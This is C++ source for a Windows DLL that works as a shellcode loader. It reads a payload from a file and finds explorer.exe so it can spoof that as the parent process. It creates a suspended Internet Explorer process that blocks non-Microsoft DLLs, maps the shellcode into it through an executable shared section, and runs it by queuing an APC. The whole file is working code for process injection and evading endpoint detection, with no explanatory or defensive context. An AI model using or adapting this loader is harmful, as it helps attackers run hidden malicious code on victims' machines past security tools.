#include <Windows.h>
#include "tlhelp32.h"
#include "ntdll.h"
#include <iostream>

#pragma comment(lib, "ntdll")
#pragma warning(disable : 4996)

DWORD getPID(LPCWSTR processName) {

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName))
                break;
        } while (Process32Next(snapshot, &process));
    }
    CloseHandle(snapshot);
    return process.th32ProcessID;
}

DllExport void test() {

    DWORD ppid = getPID(L"explorer.exe");

    DWORD dwRead = 0;
    SIZE_T sizeBuffer = 0;
    HANDLE hSection = NULL, hFile = NULL;
    PVOID pViewLocal = NULL, pViewRemote = NULL, pSH = NULL;


    //Shellcode gets read from file and mapped to the newly created process
    hFile = CreateFileW(L"HelloWorld.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    sizeBuffer = GetFileSize(hFile, NULL);
    pSH = VirtualAlloc(0, sizeBuffer, MEM_COMMIT, PAGE_READWRITE);
    ReadFile(hFile, pSH, (DWORD)sizeBuffer, &dwRead, NULL);
    printf("Shellcode Size: %u bytes\n", sizeBuffer);

    NTSTATUS Status;

    UNICODE_STRING NtImagePath, CurrentDirectory, CommandLine;
    RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Program Files\\Internet Explorer\\iexplore.exe");
    RtlInitUnicodeString(&CurrentDirectory, (PWSTR)L"C:\\Program Files\\Internet Explorer");
    RtlInitUnicodeString(&CommandLine, (PWSTR)L"\"C:\\Program Files\\Internet Explorer\\iexplore.exe\"");

    // user process parameters
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;

    Status = RtlCreateProcessParametersEx(
        &ProcessParameters,
        &NtImagePath,
        NULL,
        &CurrentDirectory,
        &CommandLine,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED);

    if (!NT_SUCCESS(Status)) {
        printf("RtlCreateProcessParametersEx failed");
        
    }

    // Initialize the PS_CREATE_INFO structure
    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    // Initialize the PS_ATTRIBUTE_LIST structure
    ULONG AttributeCount = 3;
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * AttributeCount);

    AttributeList->TotalLength = FIELD_OFFSET(PS_ATTRIBUTE_LIST, Attributes) + (sizeof(PS_ATTRIBUTE) * AttributeCount);

    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

    // PPID Spoofing Section
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);

    CLIENT_ID cid = { (HANDLE)ppid, NULL };

    HANDLE hParent = NULL;
    Status = NtOpenProcess(&hParent, PROCESS_CREATE_PROCESS, &oa, &cid);

    if (!NT_SUCCESS(Status)) {
        printf("NtOpenProcess failed.\n");
    }

    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    AttributeList->Attributes[1].Size = sizeof(HANDLE);
    AttributeList->Attributes[1].ValuePtr = hParent;

    //BlockDLL
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;
    AttributeList->Attributes[2].Size = sizeof(DWORD64);
    AttributeList->Attributes[2].ValuePtr = &policy;

    // Create the process
    HANDLE hProcess = NULL, hThread = NULL;
    OBJECT_ATTRIBUTES ProcessObjectAttributes, ThreadObjectAttributes = { 0 };

    InitializeObjectAttributes(&ProcessObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    InitializeObjectAttributes(&ThreadObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    Status = NtCreateUserProcess(
        &hProcess,
        &hThread,
        MAXIMUM_ALLOWED,
        MAXIMUM_ALLOWED,
        &ProcessObjectAttributes,
        &ThreadObjectAttributes,
        PROCESS_CREATE_FLAGS_INHERIT_FROM_PARENT,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        ProcessParameters,
        &CreateInfo,
        AttributeList);

    if (!NT_SUCCESS(Status)) {
        printf("NtCreateUserProcess() failed : %08lX\n", Status);
    }

    // Clean up
    RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
    RtlDestroyProcessParameters(ProcessParameters);

    // Shellcode execution stuff
    Status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sizeBuffer, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(Status)) {
        printf("[-] Failed to create section\n");
        
    }
    printf("[*] Created section: 0x%p\n", hSection);
    Status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pViewLocal, 0, 0, NULL, &sizeBuffer, ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(Status)) {
        printf("[-] Failed to map view of section locally\n");
        
    }
    printf("[*] Mapped section locally: 0x%p\n", pViewLocal);
    Status = NtMapViewOfSection(hSection, hProcess, &pViewRemote, 0, 0, NULL, &sizeBuffer, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(Status)) {
        printf("[-] Failed to map view of section remotely\n");
        
    }
    printf("[*] Mapped section remote: 0x%p\n", pViewRemote);
    for (int i = 0; i < sizeBuffer; i++)
        *((PBYTE)pViewLocal + i) = *((PBYTE)pSH + i);
    Status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)pViewRemote, pViewRemote, NULL, NULL); if (!NT_SUCCESS(Status)) {
        printf("[-] Failed to call NtQueueApcThread\n");
        
    }
    printf("[*] NtQueueApcThread successfull\n");

    Status = NtResumeThread(hThread, NULL);
    if (!NT_SUCCESS(Status)) {
        printf("[-] Failed to resume thread\n");
        
    }
    printf("[*] Resumed thread\n");
}

BOOL WINAPI DllMain(
    IN HINSTANCE hinstDLL,
    IN DWORD     fdwReason,
    IN LPVOID    lpvReserved
)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
